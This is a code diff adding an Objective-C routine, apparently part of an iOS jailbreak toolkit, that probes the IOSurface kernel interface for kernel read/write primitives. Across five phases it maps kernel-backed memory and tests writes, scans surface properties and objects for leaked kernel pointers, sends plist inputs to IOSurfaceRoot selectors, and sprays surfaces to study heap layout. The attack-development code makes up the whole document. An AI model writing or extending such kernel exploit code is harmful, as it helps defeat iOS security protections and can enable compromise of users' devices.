@@ -33559,3 +33559,593 @@ void iosurface_syscall_redirect(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// MARK: - JB36: IOSurface Kernel R/W Primitives
+void iosurface_kernel_rw(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB36: === IOSurface Kernel R/W Primitives ===");
+        log(@"JB36: IOServiceOpen OK, need struct input for selectors");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        extern void jb25_setup(void);
+        extern volatile unsigned long jb25_far;
+        extern volatile unsigned long jb25_esr;
+        extern volatile int jb25_sig;
+        extern volatile sig_atomic_t jb25_in_probe;
+        extern struct jb25_jb_holder *jb25_jb_ptr;
+        jb25_setup();
+
+        // All IOKit typedefs — CORRECT pointer-width returns
+        typedef void *(*IOServiceMatching_fn)(const char *);
+        typedef unsigned int (*IOServiceGetMatchingService_fn)(unsigned int, void *);
+        typedef int (*IOServiceOpen_fn)(unsigned int, unsigned int, unsigned int, unsigned int *);
+        typedef int (*IOConnectCallMethod_fn)(unsigned int, uint32_t,
+            const uint64_t *, uint32_t, const void *, size_t,
+            uint64_t *, uint32_t *, void *, size_t *);
+        typedef int (*IOConnectMapMemory64_fn)(unsigned int, uint32_t,
+            unsigned int, uint64_t *, uint64_t *, uint32_t);
+        typedef int (*IOConnectUnmapMemory64_fn)(unsigned int, uint32_t,
+            unsigned int, uint64_t);
+        typedef unsigned int (*mach_task_self_fn)(void);
+
+        IOServiceMatching_fn matchFn = dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        IOServiceGetMatchingService_fn getSvcFn = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        IOServiceOpen_fn openFn = dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        IOConnectCallMethod_fn callMethodFn = dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        IOConnectMapMemory64_fn mapMemFn = dlsym(RTLD_DEFAULT, "IOConnectMapMemory64");
+        IOConnectUnmapMemory64_fn unmapMemFn = dlsym(RTLD_DEFAULT, "IOConnectUnmapMemory64");
+        mach_task_self_fn taskSelfFn = dlsym(RTLD_DEFAULT, "mach_task_self");
+
+        unsigned int task = taskSelfFn ? taskSelfFn() : 0;
+
+        // IOSurface public API
+        typedef void *(*IOSurfaceCreate_fn)(void *);
+        typedef uint32_t (*IOSurfaceGetID_fn)(void *);
+        typedef void *(*IOSurfaceGetBaseAddress_fn)(void *);
+        typedef size_t (*IOSurfaceGetAllocSize_fn)(void *);
+        typedef int (*IOSurfaceLock_fn)(void *, uint32_t, uint32_t *);
+        typedef int (*IOSurfaceUnlock_fn)(void *, uint32_t, uint32_t *);
+        typedef void (*IOSurfaceSetValue_fn)(void *, void *, void *);
+        typedef void *(*IOSurfaceCopyValue_fn)(void *, void *);
+        typedef void *(*IOSurfaceCopyAllValues_fn)(void *);
+
+        IOSurfaceCreate_fn surfCreate = dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn surfGetID = dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_fn surfGetBase = dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_fn surfGetSize = dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_fn surfLock = dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_fn surfUnlock = dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+        IOSurfaceSetValue_fn surfSetVal = dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        IOSurfaceCopyValue_fn surfCopyVal = dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+        IOSurfaceCopyAllValues_fn surfCopyAll = dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+
+        log([NSString stringWithFormat:@"JB36:   IOConnectMapMemory64 = %p", mapMemFn]);
+        log([NSString stringWithFormat:@"JB36:   IOSurfaceSetValue = %p", surfSetVal]);
+        log([NSString stringWithFormat:@"JB36:   IOSurfaceCopyValue = %p", surfCopyVal]);
+
+        // =====================================================================
+        // FASE 1: Open IOSurfaceRoot + map kernel memory types
+        // =====================================================================
+        log(@"JB36: === Fase 1: IOConnectMapMemory64 ===");
+
+        unsigned int connect = 0;
+
+        if (matchFn && getSvcFn && openFn) {
+            void *matching = matchFn("IOSurfaceRoot");
+            unsigned int service = matching ? getSvcFn(0, matching) : 0;
+            log([NSString stringWithFormat:@"JB36:   service=%u", service]);
+
+            if (service) {
+                int openRet = openFn(service, task, 0, &connect);
+                log([NSString stringWithFormat:@"JB36:   IOServiceOpen=%d connect=%u", openRet, connect]);
+                results[@"connect"] = @(connect);
+            }
+        }
+
+        if (connect && mapMemFn) {
+            for (uint32_t memType = 0; memType < 8; memType++) {
+                uint64_t addr = 0;
+                uint64_t size = 0;
+
+                jb25_far = 0; jb25_sig = 0;
+                int mapRet = -999;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    mapRet = mapMemFn(connect, memType, task, &addr, &size, 0);
+                    jb25_in_probe = 0;
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB36:   map(type=%u) FAULT sig=%d", memType, jb25_sig]);
+                    continue;
+                }
+
+                log([NSString stringWithFormat:@"JB36:   map(type=%u) ret=%d addr=%#llx size=%#llx",
+                     memType, mapRet, addr, size]);
+
+                if (mapRet == 0 && addr != 0 && size > 0) {
+                    log([NSString stringWithFormat:@"JB36:   [+] MAPPED type=%u: %llu bytes at %#llx",
+                         memType, size, addr]);
+                    results[[NSString stringWithFormat:@"map%u_addr", memType]] =
+                        [NSString stringWithFormat:@"%#llx", addr];
+                    results[[NSString stringWithFormat:@"map%u_size", memType]] =
+                        [NSString stringWithFormat:@"%#llx", size];
+
+                    // Safe read first 64 bytes
+                    jb25_far = 0; jb25_sig = 0;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        uint64_t *m = (uint64_t *)(uintptr_t)addr;
+                        log([NSString stringWithFormat:@"JB36:     [0]=%#llx [1]=%#llx [2]=%#llx [3]=%#llx",
+                             m[0], m[1], m[2], m[3]]);
+                        log([NSString stringWithFormat:@"JB36:     [4]=%#llx [5]=%#llx [6]=%#llx [7]=%#llx",
+                             m[4], m[5], m[6], m[7]]);
+
+                        // Write test
+                        uint64_t orig = m[0];
+                        m[0] = 0xDEAD36BEEF36ULL;
+                        uint64_t rb = m[0];
+                        m[0] = orig;
+                        int writable = (rb == 0xDEAD36BEEF36ULL) ? 1 : 0;
+                        log([NSString stringWithFormat:@"JB36:     writable=%d", writable]);
+                        results[[NSString stringWithFormat:@"map%u_writable", memType]] = @(writable);
+                        jb25_in_probe = 0;
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB36:     read FAULT sig=%d", jb25_sig]);
+                    }
+
+                    // Unmap after reading
+                    if (unmapMemFn) {
+                        unmapMemFn(connect, memType, task, addr);
+                    }
+                }
+
+                if (isr_stopped()) break;
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: IOSurface SetValue/CopyValue — kernel address leaks
+        // =====================================================================
+        log(@"JB36: === Fase 2: IOSurface property leak ===");
+
+        if (surfCreate && surfSetVal && surfCopyVal) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceAllocSize": @(4096),
+            };
+
+            void *surf = surfCreate((__bridge void *)props);
+            if (surf) {
+                uint32_t surfID = surfGetID ? surfGetID(surf) : 0;
+                log([NSString stringWithFormat:@"JB36:   Surface ID=%u", surfID]);
+
+                // Set custom properties with large values (try to trigger kernel allocs)
+                NSData *bigData = [[NSMutableData alloc] initWithLength:4096];
+                memset((void *)[bigData bytes], 0x42, 4096);
+
+                surfSetVal(surf, (__bridge void *)@"JB36TestKey",
+                           (__bridge void *)bigData);
+
+                // Read back
+                id readVal = (__bridge id)surfCopyVal(surf, (__bridge void *)@"JB36TestKey");
+                if (readVal && [readVal isKindOfClass:[NSData class]]) {
+                    NSData *rd = (NSData *)readVal;
+                    log([NSString stringWithFormat:@"JB36:   SetValue/CopyValue roundtrip: %lu bytes",
+                         (unsigned long)[rd length]]);
+                    results[@"valueRoundtrip"] = @([rd length] == 4096 ? 1 : 0);
+                }
+
+                // Set a pointer-sized integer — might leak through alignment
+                surfSetVal(surf, (__bridge void *)@"JB36PtrTest",
+                           (__bridge void *)@(0xFFFFFFFF41414141ULL));
+
+                id ptrVal = (__bridge id)surfCopyVal(surf, (__bridge void *)@"JB36PtrTest");
+                if (ptrVal) {
+                    log([NSString stringWithFormat:@"JB36:   PtrTest readback: %@", ptrVal]);
+                }
+
+                // CopyAllValues — dump everything
+                if (surfCopyAll) {
+                    NSDictionary *allVals = (__bridge NSDictionary *)surfCopyAll(surf);
+                    if (allVals) {
+                        log([NSString stringWithFormat:@"JB36:   All properties: %lu keys",
+                             (unsigned long)[allVals count]]);
+
+                        for (NSString *k in allVals) {
+                            id v = allVals[k];
+                            if ([v isKindOfClass:[NSNumber class]]) {
+                                uint64_t numVal = [v unsignedLongLongValue];
+                                log([NSString stringWithFormat:@"JB36:   %@ = %llu (%#llx)", k, numVal, numVal]);
+                                // Kernel pointer range on arm64 iOS
+                                if (numVal > 0xFFFFFF0000000000ULL) {
+                                    log([NSString stringWithFormat:@"JB36:   [LEAK!] %@ looks like kernel ptr!", k]);
+                                    results[[NSString stringWithFormat:@"leak_%@", k]] =
+                                        [NSString stringWithFormat:@"%#llx", numVal];
+                                }
+                            } else if ([v isKindOfClass:[NSData class]]) {
+                                NSData *d = (NSData *)v;
+                                log([NSString stringWithFormat:@"JB36:   %@ = <data %lu bytes>", k,
+                                     (unsigned long)[d length]]);
+                                // Check for kernel pointers in data
+                                if ([d length] >= 8) {
+                                    const uint64_t *dp = (const uint64_t *)[d bytes];
+                                    for (NSUInteger i = 0; i < [d length] / 8 && i < 16; i++) {
+                                        if (dp[i] > 0xFFFFFF0000000000ULL) {
+                                            log([NSString stringWithFormat:@"JB36:   [LEAK!] %@[%lu] = %#llx",
+                                                 k, (unsigned long)i, dp[i]]);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: IOConnectCallMethod with XML plist struct input
+        // =====================================================================
+        log(@"JB36: === Fase 3: IOConnectCallMethod struct input ===");
+
+        if (connect && callMethodFn && surfCreate) {
+            // Create a surface to get a valid ID
+            NSDictionary *props2 = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceAllocSize": @(4096),
+            };
+            void *surf2 = surfCreate((__bridge void *)props2);
+            uint32_t surfID2 = surfGetID ? surfGetID(surf2) : 0;
+            log([NSString stringWithFormat:@"JB36:   Test surface ID=%u", surfID2]);
+
+            // Serialize properties as XML plist for struct input
+            NSError *err = nil;
+            NSData *xmlData = [NSPropertyListSerialization
+                dataWithPropertyList:props2
+                format:NSPropertyListXMLFormat_v1_0
+                options:0
+                error:&err];
+
+            if (xmlData) {
+                log([NSString stringWithFormat:@"JB36:   XML plist: %lu bytes", (unsigned long)[xmlData length]]);
+
+                // Also try binary plist
+                NSData *binData = [NSPropertyListSerialization
+                    dataWithPropertyList:props2
+                    format:NSPropertyListBinaryFormat_v1_0
+                    options:0
+                    error:&err];
+                log([NSString stringWithFormat:@"JB36:   Binary plist: %lu bytes",
+                     binData ? (unsigned long)[binData length] : 0]);
+
+                // Try selector 0 (create_surface) with XML plist struct input
+                uint8_t outBuf[4096] = {0};
+                size_t outBufSize = sizeof(outBuf);
+
+                jb25_far = 0; jb25_sig = 0;
+                int ret0 = -999;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    ret0 = callMethodFn(connect, 0,
+                        NULL, 0,
+                        [xmlData bytes], [xmlData length],
+                        NULL, NULL,
+                        outBuf, &outBufSize);
+                    jb25_in_probe = 0;
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB36:   sel0(xml) FAULT sig=%d", jb25_sig]);
+                }
+
+                log([NSString stringWithFormat:@"JB36:   sel0(xml) = %d outSize=%zu", ret0, outBufSize]);
+                results[@"sel0_xml"] = @(ret0);
+
+                if (ret0 == 0 && outBufSize > 0) {
+                    log(@"JB36:   [+] sel0 with XML plist WORKS!");
+                    // Parse output as plist
+                    NSData *outData = [NSData dataWithBytes:outBuf length:outBufSize];
+                    id outPlist = [NSPropertyListSerialization
+                        propertyListWithData:outData
+                        options:NSPropertyListImmutable
+                        format:NULL
+                        error:&err];
+                    if (outPlist) {
+                        log([NSString stringWithFormat:@"JB36:   Output plist: %@", outPlist]);
+                    } else {
+                        // Dump raw hex
+                        NSMutableString *hex = [NSMutableString string];
+                        for (size_t i = 0; i < outBufSize && i < 64; i++) {
+                            [hex appendFormat:@"%02x", outBuf[i]];
+                        }
+                        log([NSString stringWithFormat:@"JB36:   Output raw: %@", hex]);
+                    }
+                }
+
+                // Try with binary plist
+                if (binData) {
+                    outBufSize = sizeof(outBuf);
+                    memset(outBuf, 0, sizeof(outBuf));
+
+                    jb25_far = 0; jb25_sig = 0;
+                    int ret0b = -999;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        ret0b = callMethodFn(connect, 0,
+                            NULL, 0,
+                            [binData bytes], [binData length],
+                            NULL, NULL,
+                            outBuf, &outBufSize);
+                        jb25_in_probe = 0;
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB36:   sel0(bin) FAULT sig=%d", jb25_sig]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB36:   sel0(bin) = %d outSize=%zu", ret0b, outBufSize]);
+                    results[@"sel0_bin"] = @(ret0b);
+
+                    if (ret0b == 0 && outBufSize > 0) {
+                        log(@"JB36:   [+] sel0 with binary plist WORKS!");
+                        NSData *outData2 = [NSData dataWithBytes:outBuf length:outBufSize];
+                        id outPlist2 = [NSPropertyListSerialization
+                            propertyListWithData:outData2
+                            options:NSPropertyListImmutable
+                            format:NULL
+                            error:&err];
+                        if (outPlist2) {
+                            log([NSString stringWithFormat:@"JB36:   Output: %@", outPlist2]);
+                        }
+                    }
+                }
+
+                // Try sel11 (get_value) with surface ID in plist
+                NSDictionary *getValInput = @{
+                    @"IOSurfaceID": @(surfID2),
+                    @"IOSurfacePropertyKey": @"IOSurfaceAllocSize",
+                };
+                NSData *getValData = [NSPropertyListSerialization
+                    dataWithPropertyList:getValInput
+                    format:NSPropertyListXMLFormat_v1_0
+                    options:0
+                    error:&err];
+
+                if (getValData) {
+                    outBufSize = sizeof(outBuf);
+                    memset(outBuf, 0, sizeof(outBuf));
+
+                    jb25_far = 0; jb25_sig = 0;
+                    int ret11 = -999;
+                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                        jb25_in_probe = 1;
+                        ret11 = callMethodFn(connect, 11,
+                            NULL, 0,
+                            [getValData bytes], [getValData length],
+                            NULL, NULL,
+                            outBuf, &outBufSize);
+                        jb25_in_probe = 0;
+                    } else {
+                        jb25_in_probe = 0;
+                        log([NSString stringWithFormat:@"JB36:   sel11 FAULT sig=%d", jb25_sig]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB36:   sel11(get_value) = %d outSize=%zu", ret11, outBufSize]);
+                    results[@"sel11"] = @(ret11);
+
+                    if (ret11 == 0 && outBufSize > 0) {
+                        NSData *outData3 = [NSData dataWithBytes:outBuf length:outBufSize];
+                        id outPlist3 = [NSPropertyListSerialization
+                            propertyListWithData:outData3
+                            options:NSPropertyListImmutable
+                            format:NULL
+                            error:&err];
+                        if (outPlist3) {
+                            log([NSString stringWithFormat:@"JB36:   sel11 output: %@", outPlist3]);
+                        }
+                    }
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: IOSurface spray — heap layout analysis
+        // =====================================================================
+        log(@"JB36: === Fase 4: IOSurface spray ===");
+
+        if (surfCreate && surfGetID && surfGetBase && surfLock && surfUnlock && surfGetSize) {
+            int numSurfaces = 32;
+            void **surfaces = (void **)calloc(numSurfaces, sizeof(void *));
+            uint32_t *ids = (uint32_t *)calloc(numSurfaces, sizeof(uint32_t));
+            uintptr_t *bases = (uintptr_t *)calloc(numSurfaces, sizeof(uintptr_t));
+
+            if (surfaces && ids && bases) {
+                for (int i = 0; i < numSurfaces; i++) {
+                    NSDictionary *p = @{
+                        @"IOSurfaceWidth": @(32),
+                        @"IOSurfaceHeight": @(32),
+                        @"IOSurfaceBytesPerElement": @(4),
+                        @"IOSurfacePixelFormat": @(0x42475241),
+                        @"IOSurfaceAllocSize": @(4096),
+                    };
+                    surfaces[i] = surfCreate((__bridge void *)p);
+                    if (surfaces[i]) {
+                        ids[i] = surfGetID(surfaces[i]);
+                        surfLock(surfaces[i], 0, NULL);
+                        void *b = surfGetBase(surfaces[i]);
+                        bases[i] = (uintptr_t)b;
+                        surfUnlock(surfaces[i], 0, NULL);
+                    }
+                }
+
+                // Analyze ID pattern
+                log([NSString stringWithFormat:@"JB36:   First ID=%u Last ID=%u", ids[0], ids[numSurfaces - 1]]);
+                int sequential = 1;
+                for (int i = 1; i < numSurfaces; i++) {
+                    if (ids[i] != ids[i - 1] + 1) { sequential = 0; break; }
+                }
+                log([NSString stringWithFormat:@"JB36:   IDs sequential: %s", sequential ? "YES" : "NO"]);
+                results[@"idsSequential"] = @(sequential);
+
+                // Analyze base address pattern
+                int sameRegion = 0;
+                int64_t totalDelta = 0;
+                for (int i = 1; i < numSurfaces && bases[i] && bases[i-1]; i++) {
+                    int64_t d = (int64_t)(bases[i] - bases[i-1]);
+                    if (d >= 0 && d <= 0x100000) sameRegion++;
+                    totalDelta += d;
+                }
+                log([NSString stringWithFormat:@"JB36:   Surfaces in same region: %d/%d", sameRegion, numSurfaces - 1]);
+                log([NSString stringWithFormat:@"JB36:   First base=%#lx Last base=%#lx",
+                     (unsigned long)bases[0], (unsigned long)bases[numSurfaces - 1]]);
+
+                if (numSurfaces > 1 && bases[0] && bases[1]) {
+                    log([NSString stringWithFormat:@"JB36:   Avg delta=%lld",
+                         totalDelta / (numSurfaces - 1)]);
+                }
+
+                results[@"sprayCount"] = @(numSurfaces);
+                results[@"firstBase"] = [NSString stringWithFormat:@"%#lx", (unsigned long)bases[0]];
+                results[@"lastBase"] = [NSString stringWithFormat:@"%#lx", (unsigned long)bases[numSurfaces - 1]];
+            }
+
+            if (surfaces) free(surfaces);
+            if (ids) free(ids);
+            if (bases) free(bases);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: IOSurface kernel object address via port analysis
+        // =====================================================================
+        log(@"JB36: === Fase 5: Kernel object via mach port ===");
+
+        typedef unsigned int (*IOSurfaceCreateMachPort_fn)(void *);
+        typedef void *(*IOSurfaceLookupFromMachPort_fn)(unsigned int);
+        IOSurfaceCreateMachPort_fn surfCreatePort = dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+        IOSurfaceLookupFromMachPort_fn surfLookupPort = dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+
+        log([NSString stringWithFormat:@"JB36:   IOSurfaceCreateMachPort = %p", surfCreatePort]);
+        log([NSString stringWithFormat:@"JB36:   IOSurfaceLookupFromMachPort = %p", surfLookupPort]);
+
+        if (surfCreate && surfCreatePort) {
+            // Create surfaces and get their mach ports
+            NSDictionary *p = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfacePixelFormat": @(0x42475241),
+            };
+
+            void *s1 = surfCreate((__bridge void *)p);
+            void *s2 = surfCreate((__bridge void *)p);
+
+            if (s1 && s2) {
+                unsigned int port1 = surfCreatePort(s1);
+                unsigned int port2 = surfCreatePort(s2);
+                uint32_t id1 = surfGetID ? surfGetID(s1) : 0;
+                uint32_t id2 = surfGetID ? surfGetID(s2) : 0;
+
+                log([NSString stringWithFormat:@"JB36:   S1: id=%u port=%u ptr=%p", id1, port1, s1]);
+                log([NSString stringWithFormat:@"JB36:   S2: id=%u port=%u ptr=%p", id2, port2, s2]);
+
+                int64_t ptrDelta = (int64_t)((uintptr_t)s2 - (uintptr_t)s1);
+                log([NSString stringWithFormat:@"JB36:   Userspace ptr delta = %lld (%#llx)",
+                     ptrDelta, (uint64_t)ptrDelta]);
+                results[@"ptrDelta"] = [NSString stringWithFormat:@"%lld", ptrDelta];
+                results[@"port1"] = @(port1);
+                results[@"port2"] = @(port2);
+
+                // Lookup from port — returns the SAME userspace object?
+                if (surfLookupPort) {
+                    void *lookedUp = surfLookupPort(port1);
+                    log([NSString stringWithFormat:@"JB36:   LookupFromMachPort(%u) = %p (original=%p)",
+                         port1, lookedUp, s1]);
+                    results[@"lookupMatch"] = @(lookedUp == s1 ? 1 : 0);
+
+                    if (lookedUp) {
+                        // The returned pointer is a CFTypeRef (IOSurfaceRef)
+                        // Its ISA pointer might contain kernel info
+                        uint64_t *objPtr = (uint64_t *)lookedUp;
+                        jb25_far = 0; jb25_sig = 0;
+                        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                            jb25_in_probe = 1;
+                            log([NSString stringWithFormat:@"JB36:   ISA = %#llx", objPtr[0]]);
+                            log([NSString stringWithFormat:@"JB36:   [1] = %#llx [2] = %#llx",
+                                 objPtr[1], objPtr[2]]);
+                            log([NSString stringWithFormat:@"JB36:   [3] = %#llx [4] = %#llx",
+                                 objPtr[3], objPtr[4]]);
+                            jb25_in_probe = 0;
+
+                            // Check if any field looks like a kernel pointer
+                            for (int i = 0; i < 32; i++) {
+                                if (objPtr[i] > 0xFFFFFF0000000000ULL) {
+                                    log([NSString stringWithFormat:@"JB36:   [KPTR?] offset %d = %#llx",
+                                         i * 8, objPtr[i]]);
+                                }
+                            }
+                        } else {
+                            jb25_in_probe = 0;
+                            log([NSString stringWithFormat:@"JB36:   read FAULT sig=%d", jb25_sig]);
+                        }
+                    }
+                }
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB36: =============================================");
+
+        BOOL hasMap = NO;
+        for (uint32_t i = 0; i < 8; i++) {
+            if (results[[NSString stringWithFormat:@"map%u_addr", i]]) { hasMap = YES; break; }
+        }
+
+        BOOL hasSel0 = ([results[@"sel0_xml"] intValue] == 0 || [results[@"sel0_bin"] intValue] == 0);
+        BOOL hasLeak = NO;
+        for (NSString *k in results) {
+            if ([k hasPrefix:@"leak_"]) { hasLeak = YES; break; }
+        }
+
+        NSString *verdict = @"ANALYSIS_COMPLETE";
+
+        if (hasMap && hasLeak) {
+            verdict = @"MAP_PLUS_LEAK";
+            log(@"JB36: [!!!!!] Kernel memory mapped + address leak!");
+        } else if (hasMap) {
+            verdict = @"KERNEL_MAPPED";
+            log(@"JB36: [!!!!] Kernel memory mapped via IOConnectMapMemory64!");
+        } else if (hasSel0) {
+            verdict = @"SELECTOR_WORKS";
+            log(@"JB36: [!!!] IOSurface selectors accept plist input!");
+        } else if (hasLeak) {
+            verdict = @"KERNEL_LEAK";
+            log(@"JB36: [!!!] Kernel address leaked via IOSurface!");
+        } else {
+            verdict = @"PARTIAL";
+            log(@"JB36: Partial results");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB36: Verdict: %@", verdict]);
+        log(@"JB36: =============================================");
+
+        isr_checkpoint(@"JB36-kernel-rw-checkpoint.json", results);
+        done(results);
+    });
+}
